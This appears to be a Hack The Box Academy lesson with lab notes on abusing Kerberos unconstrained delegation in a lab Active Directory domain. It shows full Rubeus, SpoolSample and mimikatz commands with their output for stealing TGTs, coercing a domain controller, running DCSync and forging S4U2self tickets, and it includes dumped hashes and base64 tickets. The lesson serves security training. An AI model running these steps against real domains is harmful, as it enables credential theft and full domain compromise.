
`Unconstrained delegation` was the only type of delegation available in Windows 2000. If a user requests a service ticket on a server with unconstrained delegation enabled, the user's Ticket Granting Ticket (TGT) is embedded into the service ticket that is then presented to the server.

The server can cache this ticket in memory and then pretend to be that user for subsequent resource requests in the domain. If unconstrained delegation is not enabled, only the user's Ticket Granting Service (TGS) ticket will be stored in memory. In this case, if the machine is compromised, an attacker could only access the resource specified in the TGS ticket in that user's context.

![SQL01 Properties window, Delegation tab. Option selected: Trust this computer for delegation to any service (Kerberos only). No services listed.](https://academy.hackthebox.com/storage/modules/25/UnconstrainedDelegation/sql01_ud.png)

We will walk through two attack scenarios:

- Waiting for a privileged user to authenticate
- Leveraging the Printer Bug

---

## Waiting for Privileged User Authentication

If we are able to compromise a server that has unconstrained delegation enabled, and a Domain Administrator subsequently logs in, we will be able to extract their TGT and use it to move laterally and compromise other machines, including Domain Controllers.

[Rubeus](https://github.com/GhostPack/Rubeus) is the go-to tool for this attack. As a local administrator, Rubeus can be run to monitor stored tickets. If a TGT is found within a TGS ticket, Rubeus will display it to us.

#### Monitor Stored Tickets with Rubeus

  Unconstrained Delegation - Computers

```powershell-session
PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs
```

A few moments later, `Sarah Lafferty` connects to the compromised server. Rubeus retrieves Sarah's copy of the TGT that was embedded in her TGS ticket and displays it to us encoded in base64.

#### Monitor Stored Tickets with Rubeus

  Unconstrained Delegation - Computers

```powershell-session
PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs

[*] 8/14/2020 11:06:40 AM UTC - Found new TGT:

  User                  :  sarah.lafferty@INLANEFREIGHT.LOCAL
  StartTime             :  8/14/2020 4:06:37 AM
  EndTime               :  8/14/2020 2:06:37 PM
  RenewTill             :  8/21/2020 4:06:37 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFmTCCBZWgAwIBBaEDAgEWooIEgjCCBH5hggR6MIIEdqADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggQsMIIEKKADAgESoQMCAQKiggQaBIIEFr7cTE+mYOQsYF69H0dnaQwX2Iy/dB0k91uEBGQh/Dk0lm12PzkVgX<SNIP>
```

Thanks to `PowerView`, we can list the groups to which Sarah belongs. She happens to be in the `Domain Admins` group. So we have the TGT of a Domain Admin now.

#### Group Enumeration

  Unconstrained Delegation - Computers

```powershell-session
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainGroup -MemberIdentity sarah.lafferty

grouptype              : DOMAIN_LOCAL_SCOPE, SECURITY
iscriticalsystemobject : True
samaccounttype         : ALIAS_OBJECT
samaccountname         : Denied RODC Password Replication Group
whenchanged            : 7/26/2020 8:14:37 PM
<SNIP>

grouptype              : GLOBAL_SCOPE, SECURITY
admincount             : 1
iscriticalsystemobject : True
samaccounttype         : GROUP_OBJECT
samaccountname         : Domain Admins
whenchanged            : 8/14/2020 11:04:50 AM
<SNIP>

usncreated             : 12348
grouptype              : GLOBAL_SCOPE, SECURITY
samaccounttype         : GROUP_OBJECT
samaccountname         : Domain Users
whenchanged            : 7/26/2020 8:14:37 PM
<SNIP>
```

So we will use this TGT to access the Domain Controller's `CIFS` service, for example. The `/ptt` option/flag is used to pass the received ticket into memory so that it can be used for future requests.

**Note:** We can also use the command `net view \\COMPUTERNAME` to identify available shares.

#### Using the Ticket to Request another Ticket

  Unconstrained Delegation - Computers

```powershell-session
PS C:\Tools> .\Rubeus.exe asktgs /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /service:cifs/dc01.INLANEFREIGHT.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: Ask TGS

[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (10.129.1.207)
[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'cifs/dc01.INLANEFREIGHT.local'
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

      doIFyDCCBcSgAwIBBaEDAgEWooIErTCCBKlhggSlMIIEoaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
      QUyiKzApoAMCAQKhIjAgGwRjaWZzGxhkYzAxLklOTEFORUZSRUlHSFQubG9jYWyjggRUMIIEUKADAgES
      oQMCAQOiggRCBIIEPrCawPV<SNIP>

  ServiceName           :  cifs/dc01.INLANEFREIGHT.local
  ServiceRealm          :  INLANEFREIGHT.LOCAL
  UserName              :  sarah.lafferty
  UserRealm             :  INLANEFREIGHT.LOCAL
  StartTime             :  8/14/2020 4:21:49 AM
  EndTime               :  8/14/2020 2:06:37 PM
  RenewTill             :  8/21/2020 4:06:37 AM
  Flags                 :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
  KeyType               :  aes256_cts_hmac_sha1
  Base64(key)           :  zRzk0ldsF4rb7p7/MlfRkhOzkjIHL4DSok1vXYS3lt8=
```

In case the above command doesn't work, we can also use the [renew action](https://github.com/GhostPack/Rubeus#renew) to get a brand new TGT instead of a TGS ticket:

#### Using Rubeus and renew

  Unconstrained Delegation - Computers

```powershell-session
PS C:\Tools> .\Rubeus.exe renew /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Renew Ticket

[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Building TGS-REQ renewal for: 'INLANEFREIGHT.LOCAL\brian.willis'
[+] TGT renewal request successful!
[*] base64(ticket.kirbi):

      doIGHDCCBhigAwIBBaEDAgEWooIFCDCCBQRhggUAMIIE/KADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D<SNIP>.
```

Once we have the TGS or the TGT we can effectively list the contents of the Domain Controller file system as shown in the following command.

#### Using the Ticket

  Unconstrained Delegation - Computers

```powershell-session
PS C:\Tools> dir \\dc01.inlanefreight.local\c$

 Volume in drive \\dc01.inlanefreight.local\c$ has no label.
 Volume Serial Number is 7674-0745

 Directory of \\dc01.inlanefreight.local\c$

07/27/2020  05:56 PM    <DIR>          Department Shares
07/16/2016  06:23 AM    <DIR>          PerfLogs
07/28/2020  05:35 AM    <DIR>          Program Files
07/27/2020  12:14 PM    <DIR>          Program Files (x86)
07/27/2020  07:37 PM    <DIR>          Software
07/30/2020  07:15 PM    <DIR>          Tools
07/30/2020  11:49 AM    <DIR>          Users
07/30/2020  09:13 AM    <DIR>          Windows
               0 File(s)              0 bytes
               8 Dir(s)  27,711,119,360 bytes free
```

We could also get a TGS ticket for the `LDAP` service and ask for synchronization with the DC to get all the users' password hashes.

---

## Leveraging the Printer Bug

The Printer Bug is a flaw in the [MS-RPRN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1) protocol (Print System Remote Protocol). This protocol defines the communication of print job processing and print system management between a client and a print server. To leverage this flaw, any domain user can connect to the spools named pipe with the [RpcOpenPrinter](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/989357e2-446e-4872-bb38-1dce21e1313f) method and use the [RpcRemoteFindFirstPrinterChangeNotificationEx](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d) method, and force the server to authenticate to any host provided by the client over SMB.

In other words, the Printer Bug flaw can be leveraged to coerce a server to authenticate back to an arbitrary host. It can be combined with unconstrained delegation to force a Domain Controller to authenticate to a host we control. For example, if we can gain control of `SQL01` in the example above, then we may coerce `DC01` to authenticate back to the compromised host and retrieve the TGT for `DC01`. Using this TGT, we would then be able to gain full access to `DC01` and perform attacks such as `DCSync` to compromise the domain. If the Domain Controller(s) do not have the spooler service running, we can use this against any other computer in the domain and craft silver tickets with `Rubeus`, using the computer's account TGT. Silver tickets will be discussed later in this module.

This attack can be performed using [SpoolSample PoC](https://github.com/leechristensen/SpoolSample), which is used to coerce Windows hosts to authenticate to other hosts via the `MS-RPRN RPC` interface.

Let's walk through an example using `SQLO1` and `DC01` in our lab. In a scenario where a compromised host configured with unconstrained delegation has the spool service running, in this case, the Domain Controller, the `SpoolSample` tool can be combined with `Rubeus` to monitor for logon events and capture the TGT of the target host.

Once we compromise a host configured to allow unconstrained delegation, we can attempt this attack against a Domain Controller by first starting `Rubeus` in monitor mode on the compromised host (SQL01 in our example).

#### Monitoring Tickets with Rubeus

  Unconstrained Delegation - Computers

```powershell-session
PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs
```

With `Rubeus` running in monitor mode, we then attempt to trigger the Printer Bug from the same host (SQL01) by running the `SpoolSample` tool in another console window. The syntax for this tool is `SpoolSample.exe <target server> <capture server>`, where the target server in our example lab is `DC01` and the capture server is `SQL01`.

#### Abusing the Printer Bug

  Unconstrained Delegation - Computers

```powershell-session
PS C:\Tools> .\SpoolSample.exe dc01.inlanefreight.local sql01.inlanefreight.local

[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\dc01.inlanefreight.local, CaptureServer: \\sql01.inlanefreight.local
Target server attempted authentication and got an access denied. If coercing authentication to an NTLM challenge-response capture tool(e.g. responder/inveigh/MSF SMB capture), this is expected and indicates the coerced authentication worked.
```

If everything works as expected, we will get the above confirmation message from the tool. Switching back to the console running `Rubeus` in monitor mode, we retrieved the TGT from the `DC01$` account, which is the Domain Controller machine account.

#### Monitoring Tickets with Rubeus

  Unconstrained Delegation - Computers

```powershell-session
PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs

[*] 8/14/2020 11:49:26 AM UTC - Found new TGT:

  User                  :  DC01$@INLANEFREIGHT.LOCAL
  StartTime             :  8/14/2020 4:22:44 AM
  EndTime               :  8/14/2020 2:22:44 PM
  RenewTill             :  8/20/2020 6:52:29 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFZjCCBWKgAwIBBaEDAgEWooIEWTCCBFVhggRRMIIETaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUl<SNIP>
```

We can use this ticket to get a new valid TGT in memory using the `renew` option in `Rubeus`.

#### Renewing the ticket with Rubeus

  Unconstrained Delegation - Computers

```powershell-session
PS C:\Tools> .\Rubeus.exe renew /ticket:doIFZjCCBWKgAwIBBaEDAgEWooIEWTCCBFVhggRRMIIETaADAgEFoRUbE0lOTEFORUZSRUlHSFQ
uTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggQDMIID/6ADAgESoQMCAQKiggPxBIID7XBw4BNnnymchVY/H/
9966JMGtJhKaNLBt21SY3+on4lrOrHo<SNIP> /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: Renew Ticket

[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (10.129.1.207)
[*] Building TGS-REQ renewal for: 'INLANEFREIGHT.LOCAL\DC01$'
[+] TGT renewal request successful!
[*] base64(ticket.kirbi):

      doIFZjCCBWKgAwIBBaEDAgEWooIEWTCCBFVhggRRMIIETaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
      QUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggQDMIID/6ADAgESoQMC
      AQKiggPxBIID7W7EOz2Zqm1a6b9/cCHeJbZdt0qgV8Wgw1BS2Jctk8X9l6ibkK7G+s/jyPDL6ReV0OvP
      p3ClWOjdoLO3jH<SNIP>
    
[+] Ticket successfully imported!
```

Now that we have the TGT of `DC01$` in memory, we can perform the `DCsync` attack to retrieve a target user's NTLM password hash. In this example, we retrieve secrets for the user `sarah.lafferty`.

#### Performing DCSync

  Unconstrained Delegation - Computers

```cmd-session
C:\Tools> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
  
mimikatz # lsadump::dcsync /user:sarah.lafferty

[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'sarah.lafferty' will be the user account

Object RDN           : sarah.lafferty

** SAM ACCOUNT **

SAM Username         : sarah.lafferty
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Account expiration   :
Password last change : 8/14/2020 4:06:13 AM
Object Security ID   : S-1-5-21-2974783224-3764228556-2640795941-1122
Object Relative ID   : 1122

Credentials:
  Hash NTLM: 0fcb586d2aec31967c8a310d1ac2bf50
    ntlm- 0: 0fcb586d2aec31967c8a310d1ac2bf50
    ntlm- 1: cf3a5525ee9414229e66279623ed5c58
    lm  - 0: 2fd05b1ff89bfeed627937845f3bc535
    lm  - 1: 3cf0c818426269923b3a993b071b81d5

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : e27b6e4d84697eb7cf50dc6d0efdb226

* Primary:Kerberos-Newer-Keys *
    Default Salt : INLANEFREIGHT.LOCALsarah.lafferty
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : ba5b9b6850a1aea865ab1a7fdc895d1e27f39c327b8f7d4c96132b4438727386
      aes128_hmac       (4096) : bee242dbe9cb898c67b8075e13384b22
      des_cbc_md5       (4096) : 029e1c2af1237351
    OldCredentials
      aes256_hmac       (4096) : 13b57fa4a6c0f4adce4b1d85e64a909d35dce98736909f370154f9bd08b8bc67
      aes128_hmac       (4096) : 1fdbc782bcdfcd692923dc54785d5ee1
      des_cbc_md5       (4096) : ba677a73a82a2a9e

* Primary:Kerberos *
    Default Salt : INLANEFREIGHT.LOCALsarah.lafferty
    Credentials
      des_cbc_md5       : 029e1c2af1237351
    OldCredentials
      des_cbc_md5       : ba677a73a82a2a9e

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  966bec5d60500f0e964fb78be94cc0a8
    02  1abbf4255613844082376a5288cfcfb2
    03  c74c93a52310d2a88581ffb075aeff33
    <SNIP>
```

We can capture any account's hash, such as the Administrator account, and then we can use Rubeus or Mimikatz to get a ticket from the compromised account. For example, let's take Sarah' hash `0fcb586d2aec31967c8a310d1ac2bf50` and create a ticket with it:

#### Using Rubeus to Request a Ticket as Sarah

  Unconstrained Delegation - Computers

```powershell-session
PS C:\Tools> .\Rubeus.exe asktgt /rc4:0fcb586d2aec31967c8a310d1ac2bf50 /user:sarah.lafferty /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 0fcb586d2aec31967c8a310d1ac2bf50
[*] Building AS-REQ (w/ preauth) for: 'INLANEFREIGHT.LOCAL\sarah.lafferty'
[*] Using domain controller: 172.16.99.3:88
[+] TGT request successful!
[*] base64(ticket.kirbi):
<SNIP>
```

Now we can use this ticket and impersonate Sarah:

#### Using Sarah's Ticket to get access to the Domain Controller

  Unconstrained Delegation - Computers

```powershell-session
PS C:\Tools> dir \\dc01.inlanefreight.local\c$

 Volume in drive \\dc01.inlanefreight.local\c$ has no label.
 Volume Serial Number is 7674-0745

 Directory of \\dc01.inlanefreight.local\c$

07/27/2020  05:56 PM    <DIR>          Department Shares
07/16/2016  06:23 AM    <DIR>          PerfLogs
07/28/2020  05:35 AM    <DIR>          Program Files
07/27/2020  12:14 PM    <DIR>          Program Files (x86)
07/27/2020  07:37 PM    <DIR>          Software
07/30/2020  07:15 PM    <DIR>          Tools
07/30/2020  11:49 AM    <DIR>          Users
07/30/2020  09:13 AM    <DIR>          Windows
               0 File(s)              0 bytes
               8 Dir(s)  27,711,119,360 bytes free
```

### S4U2self for Non-Domain Controllers

If the target computer is not a domain controller, or if we want to execute attacks other than `DCSync`, we can use `S4U2self` to obtain a Service Ticket on behalf of any user we want to impersonate.

With the ticket captured from `DC01` using `Rubeus monitor` and `SpoolSample` we can use `Rubeus s4u /self` to forge a service ticket for any service. Let's create a ticket to connect through SMB using the `CIFS` service. We will need to use `Rubeus s4u /self`, set the alternative service to `CIFS`, and use the ticket we have:

  Unconstrained Delegation - Computers

```powershell-session
PS C:\Tools> .\Rubeus.exe s4u /self /nowrap /impersonateuser:Administrator /altservice:CIFS/dc01.inlanefreight.local /ptt /ticket:doIFZjCCBWKgAwIBBaEDAgEWooIEWTCCB<SNIP>
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'DC01$@INLANEFREIGHT.LOCAL'
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Sending S4U2self request to 172.16.99.3:88
[+] S4U2self success!
[*] Substituting alternative service name 'CIFS/dc01.inlanefreight.local'
[*] Got a TGS for 'Administrator' to 'CIFS@INLANEFREIGHT.LOCAL'
[*] base64(ticket.kirbi):
<SNIP>
```

This command allows us to impersonate `Administrator` and request a service ticket for the `CIFS` service, enabling SMB connections as the impersonated user. This method is particularly useful for scenarios where we have a ticket from a computer that is not a domain controller.

  Unconstrained Delegation - Computers

```powershell-session
PS C:\Tools> ls \\dc01.inlanefreight.local\c$

    Directory: \\dc01.inlanefreight.local\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         4/3/2023   2:58 PM                carole.holmes
d-----        2/25/2022  10:20 AM                PerfLogs
d-r---        10/6/2021   3:50 PM                Program Files
d-----        4/12/2023   3:24 PM                Program Files (x86)
d-----        3/30/2023  11:08 AM                Shares
d-----         4/4/2023   1:49 PM                Tools
d-----        3/30/2023   3:13 PM                Unconstrained
d-r---         4/4/2023  11:34 AM                Users
d-----       10/14/2022   6:49 AM                Windows
```



---

# Lab


## Connect via RDP to the target IP on port 23389 with Derek Walker's credentials, a local administrator on SQL01, which is a machine with Unconstrained Delegation. Wait for a user to connect and then try to read the content of `\\DC01\Shares\Marketing\flag.txt`


```
[*] 10/14/2025 9:29:07 PM UTC - Found new TGT:

  User                  :  brian.willis@INLANEFREIGHT.LOCAL
  StartTime             :  10/14/2025 4:29:04 PM
  EndTime               :  10/15/2025 1:57:56 AM
  RenewTill             :  10/21/2025 3:56:21 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

doIGHDCCBhigAwIBBaEDAgEWooIFCDCCBQRhggUAMIIE/KADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggSyMIIErqADAgESoQMCAQKiggSgBIIEnB+7TO7dmsgzqh14HGQ77Mppft+U9m6s0PU3Louem+JVYn3Fnf73R9N3HnnI4APxw9cQUhzITROACyZqa6RCmPROKC8txZGU6XDjZTnHMsT6+aTo1LyaOG1nEKyATLcLXW3GtVQs+xL+RiGTDLa4VfnrrWe9wmTGmRCvbvbiCvEFO60vKFHpxEcjis0N3Wm4cV3fuMyZ1N6f80sLGsTNwPc06uhvAFx+hnGVxMKLU1S0fBx7qlQp4VQrtEzMcNrnNAto61LXrU2DZRhiRCPxZop5I60I0EO0Vsw4upk/XUqHP1sU+aXB6/aIq60BTmootoEGQ3jNycL3yiWdR46TCMnpbrwsdJ+p3wXXWS2z3BjGfjxqDvq/d7hmZD4SOAksh7m0g1fBQbXuOmlfgcrv8n3PZuRP4CJslJ9Suq7vtzDeFSEVkFHVdf/1wQuY8wIeZvC+oAgJAd1rJe6MzslqmvNIw2QVx6yQGeudTpZrymHMujNCJA5wFJ5UKCrhyUXEAB05FT/ytctctQR9DzsgVrPvr7nxOOm4V0qZxvuRQIuaxZY2BlkiU2brHbD0EiEvlrQdPIyEnU+U+uh/pdX67E6qv0HPWan4T7AxQvAt1NPWGywWfqXmJmC8ABTfa+ZQDRIo5cGI5vHDHTxfnfqpuTS5Ja4jJeoYMX5LMt7fIOg9U+98DnirsL5/6KD0je+Hmu6NL621Lofxg2ReS1wOsC2qPgLLHT6TmjE6C37tn3xpPPaVeblSWzkcOQA01xgbIqVoRvt22p8M9h2S1TY3Xfp5ouJzO1qF65bZ/3Fw2Mrcj7Bo7llDPiUlo0Hy/qdqvWvI7FVPrTndMmeseM8fcXP88rz7NIgwA+DDhhlCOVIrkyGbql81/W1hZPfhEqmpJknH+exKJ7+CUvakuCYuyESZZYtBJ45YeWcutRp18B+ZJvbgcgWstLanfAFSGIUTqHheQZZEhNNloh4AXZ4u7RODq6M/EvOC4zjuX8Y7u67PbGv2vF/7AuXlXquf2gFgKHgfTyTJG+y+KmLwTVSRS2PbgHDYdsyaaH17LsCQxWwNDl1FEDYOt1QOcs7EF3/9eEmQ+AIoGO5MouvOTCJ8Lzw0qlQqUEsoJya47e7ZiJX8/7NPu3SpiXaqHEd1Sc7R7ysCVyF4NGrHKCeQa1vHdY5CLfDlPXa7gjtwGOSbnB8e7oo43aaXl6/pnIrnUkCndhRZzyUsRiX1xVIIcrVLeOalEBjztSwmjOCP9VKCD5csASgLIi3GBTnKK2MXWpYTWD/hYtl3gVRXF+toooYoVQQfow98jXIIz2xULy5b4311adcoKXbMzv2w8GRQ5/xNhYDDYPncsGu0cip5KE4Htz6ElYJ4h6tKWPub6wux51feS4l7IU9AWAoMbBo6t0lajv9plg60bM8ovCLarcIp6l5kFjadwhvaeerSLcFTbVhd4zZEjtH5naZ/CDiZoZYVUmV11dog43+RD7VywWNrTf++zy2v7UWZ4d9P1RIbn37+jcNMfkV3iJNh2MHLBWx4KhD78Ou/spNAlpT9yU6goC0ddDEEP6yPdm9ipGijgf8wgfygAwIBAKKB9ASB8X2B7jCB66CB6DCB5TCB4qArMCmgAwIBEqEiBCDe0p0ME2iU9a6XyirePUZUJW0ly+HiLVb+RmidEQuNcqEVGxNJTkxBTkVGUkVJR0hULkxPQ0FMohkwF6ADAgEBoRAwDhsMYnJpYW4ud2lsbGlzowcDBQBgoQAApREYDzIwMjUxMDE0MjEyOTA0WqYRGA8yMDI1MTAxNTA2NTc1NlqnERgPMjAyNTEwMjEyMDU2MjFaqBUbE0lOTEFORUZSRUlHSFQuTE9DQUypKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUw=
```


## Compromise the Domain and read the content of `\\DC01\C$\Unconstrained\flag.txt`




```
c:\Tools>.\SpoolSample.exe dc01.inlanefreight.local sql01.inlanefreight.local
[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\dc01.inlanefreight.local, CaptureServer: \\sql01.inlanefreight.local\
Attempted printer notification and received an invalid handle. The coerced authentication probably worked!
```




```
PS C:\Tools> .\Rubeus.exe monitor /interval:5 /targetuser:DC01  /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: TGT Monitoring
[*] Target user     : DC01
[*] Monitoring every 5 seconds for new TGTs


[*] 10/14/2025 9:30:32 PM UTC - Found new TGT:

  User                  :  DC01$@INLANEFREIGHT.LOCAL
  StartTime             :  10/14/2025 12:38:44 PM
  EndTime               :  10/14/2025 10:38:43 PM
  RenewTill             :  10/21/2025 12:38:43 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIF3jCCBdqgAwIBBaEDAgEWooIE0TCCBM1hggTJMIIExaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggR7MIIEd6ADAgESoQMCAQKiggRpBIIEZfLQZBdThRAduxcFmXWCvpoLp2SlKSem0JtptLgVlaH2CdPFPHhULhYrReElToqH70UkfWNiX8uaCqqFXhJDu4oc76WpikpYdPMDE7/OQW7XoptjJwq17DlB7OYrJT6vOLRemHLZSR5OPdk00F4hVTV3yX146nmcJbjem/iSLKZOI0zPtCJ2vvwbOpZ7/7q4BWRNGXrrqqaoxvtYcneVLNBHwxKZFmqCRv/uTxy2eSKkwbarwTCOzOKLPq2w8koVBh3ocDr+jh13sjEtF4O9zWZ3LqdR/w+n+9fZb57XEqDmNOG/IGr4F1hv31oN/72ezidX59+exKQtUR3qKV71PUX3rMoNSt3E/Nr2V8Nxk0wI+UX0YPRZ/H/HeOkqmcj3uDj6aIrxlTGed/7YMBuMjblbY5tO7onzYltfIg0Xz2sNqejtLBC36WPww2ajxA88D1m99fZDHABQCXBb086QrmyKFHT+HBnGE77NA+kNUxd0H61a/w+nUs1hWMG6klO9dRx+TK95GpAYgpJiGfh2NzkW+T8VcbRnvGgJrPS0bEkta0mwfaDxOR0Vgj4c1xvrGSutWUg5YjfGOgVvIshE2ea69cexf9QPEE6ipNg+Dd25zrXVsS5e6FpgddZ5TvS2QOBqZytrT9nKY5oISCFKwzKcK/AyFIO1bKpseBtmpdqTDG6FMMKInNh/ef9Ex9BvVtwOzM8g70nVAzSehtHrz8Zt3NeDVQhYdry6P45YDcqM5mlFRX/DFpgTSdE1LuijRKd/EomQ2yGTrt6fNacLaSbSjZxY8oSCTKaljS0ecNB5Zkvq0jy87nKZ0dgurvla/C/tKpuQVXSa6u2mC3rr5QHlvRIxut3zpSQ9fLValA+wXNmVhqEDXbJEn2isHiiA3VfZ0bCMN2sXyLpMEThh1Ov6szaVXheqx3Fwgoj1KSzFY55NokDqscLi2NmvQ9ZBPEzMCQArCSUjllgR80z5renT8lV9asNjqYMvx5/KZSGf2LSKWWWdJFaBOrsGr8aP064uA36OL+VGEFo0MoXLGnVSd4H7ICP1XNleozChbGCfKIPSyjwD+RJScldFujsaVQ93ttSvjojd5scHtUn7bJFbnuft6EZFmzwUeVqPMMS1ObAB+fK42F+qAZWhDH2vxxBk5TO1wHp0wJPmsox3fPMNv8xtktqpw1KcTOBgZV8WAWB30xCLCajmrAZsAJaT5GLCDGoX3BXpdqYpHwjxfh/DBOojfXpXw1WhjSblsH3JhNrWniqeqvTMcKibIElGu8puB0gtfdlRGpZ0Z+KJp+FS5lrb/7ofd8FgUkXSvFtyFOFj7kzgU/59YOisAYDrThf0IeSBYwZEai7ncVm/8t3wN4E5S45LF0vsFbkrLQoTxPeNOQn5ywSdbISS52ZHBWwtPaVyRx1LQX1q+AuaQQ/XFizhoopyz8TOtnPKTdQpDZN5jmeldIFH9ZEB8Z4lRBI7c6u6C7T7oRSpnwgnj9y8nq4SM6OB+DCB9aADAgEAooHtBIHqfYHnMIHkoIHhMIHeMIHboCswKaADAgESoSIEIGsU6cbXuAvcYuBkFzvK7+d+/Hz8skSjSznYqETL0lADoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MTAxNDE3Mzg0NFqmERgPMjAyNTEwMTUwMzM4NDNapxEYDzIwMjUxMDIxMTczODQzWqgVGxN